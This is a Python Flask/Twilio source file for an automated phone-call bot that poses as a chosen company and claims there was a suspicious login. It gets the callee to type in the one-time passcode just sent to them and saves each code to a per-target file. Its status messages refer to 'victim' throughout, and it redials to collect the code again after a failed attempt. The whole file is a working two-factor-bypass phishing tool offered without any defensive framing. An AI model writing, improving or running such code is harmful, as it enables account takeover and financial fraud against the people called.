from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    sid1 = request.values['CallSid']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        try:
            a = e.strip('\n').split(' - ')
            id = a[0]
            sid = a[2]
            if sid1 == sid:
                status = 'yes'
        except:
            pass

    if status == 'yes':
        Company_Name = open(f'Extra/user_db_otp/{id}/Company Name.txt', 'r').read()
        Name = open(f'Extra/user_db_otp/{id}/Name.txt', 'r').read()
        resp.say(
            f"Automated Alert From {Company_Name}, Hello {Name}, we have noticed an unusual log in attempt was made on your {Company_Name} account, A one time passcode was sent to you, if this was you, kindly ignore,")
        gather = Gather(num_digits=1, action='/gather', timeout=17)
        gather.say('but If this was not made by you, please press 1,')
        resp.append(gather)
        open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Waiting for victim to press 1')
        return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)



@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        if 'Digits' in request.values:
            choice = request.values['Digits']

            if choice == '1':
                Digits_ = open(f'Extra/user_db_otp/{id}/Digits.txt', 'r')
                Digits = Digits_.read()
                Digits_.close()
                del Digits_
                status_ = open(f'Extra/user_db_otp/{id}/status.txt', 'w')
                status_.write('Victim Dialing OTP')
                status_.close()
                del status_
                gatherotp = Gather(num_digits=int(Digits), action='/gatherotp', timeout=300)
                gatherotp.say(
                    f'To secure your account, please dial in the {open(f"Extra/user_db_otp/{id}/Digits.txt", "r").read()} digits verification code we have sent to you,')
                resp.append(gatherotp)
                return str(resp)

            else:
                status_ = open(f'Extra/user_db_otp/{id}/status.txt', 'w')
                status_.write('Redirecting the victim to starting point...')
                status_.close()
                del status_
                resp.say("Sorry, I don't understand that choice.")
                resp.redirect('/voice')
                return str(resp)
        else:
            resp.redirect('/voice')
            return str(resp)
    else:
        resp.say('Nothing!')
        return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    """Processes results from the <Gather> prompt in /voice"""
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        resp.say('Thank you, Please give us a moment, while we connect you to one of our live support agents,')
        if 'Digits' in request.values:
            status_ = open(f'Extra/user_db_otp/{id}/status.txt', 'w')
            status_.write('OTP Gathered')
            status_.close()
            del status_
            a = open(f'Extra/user_db_otp/{id}/otp.txt', 'w', encoding='utf-8')
            choice1 = request.values['Digits']
            a.write(choice1)
            a.close()
            resp.play(url='https://ia601407.us.archive.org/14/items/music_20220117/music.mp3')
            resp.say(
                'It seems like the support are too busy at the moment, If you accidently typed in the wrong verification code, We will call you again,')
            return str(resp)

        else:
            status_ = open(f'Extra/user_db_otp/{id}/status.txt', 'w')
            status_.write('No Otp. Redirect Victim To Redial Otp')
            status_.close()
            del status_
            resp.say("Sorry, Please Dial Your Code")
            resp.redirect('/gather')
            return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route("/voiceagain", methods=['GET', 'POST'])
def voiceagain():
    # Start a TwiML response
    resp = VoiceResponse()
    phone = request.values['Called']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    status = ''
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        phone1 = a[1]
        id = a[0]
        if phone1 in phone:
            status = 'yes'

    if status == 'yes':
        Company_Name_ = open(f'Extra/user_db_otp/{id}/Company Name.txt', 'r')
        Company_Name = Company_Name_.read()
        Company_Name_.close()
        del Company_Name_
        Name_ = open(f'Extra/user_db_otp/{id}/Name.txt', 'r')
        Name = Name_.read()
        Name_.close()
        del Name_
        resp.say(f"Automated Alert From {Company_Name},Hello {Name}, it seems like you accidently type wrong code,")
        gather = Gather(num_digits=1, action='/gather', timeout=300)
        gather.say('To enter the verification code again, Press 1,')
        resp.append(gather)
        open(f'Extra/user_db_otp/{id}/status.txt', 'w').write('Waiting for victim...')
        open(f'Extra/user_queue1', 'a').write(f'{id}\n')
        return str(resp)
    else:
        resp.say(f"Nothing!")
        return str(resp)

@app.route("/status_fallback", methods=['GET', 'POST'])
def status_fallback():
    sid = request.values['CallSid']
    recording = request.values['RecordingUrl']
    callsid = request.values['RecordingSid']
    raw_queue = open('Extra/user_queue', 'r').readlines()
    open('Extra/user_queue', 'w').close()
    for e in raw_queue:
        a = e.strip('\n').split(' - ')
        id = a[0]
        sid1 = a[2]
        if not sid == sid1:
            open('Extra/user_queue', 'a').write(e)
        else:
            open(f'Extra/user_db_otp/{id}/recording.txt', 'w').write(f'{recording} - {callsid}')

    return ''

if __name__ == "__main__":
    app.run(debug=True)
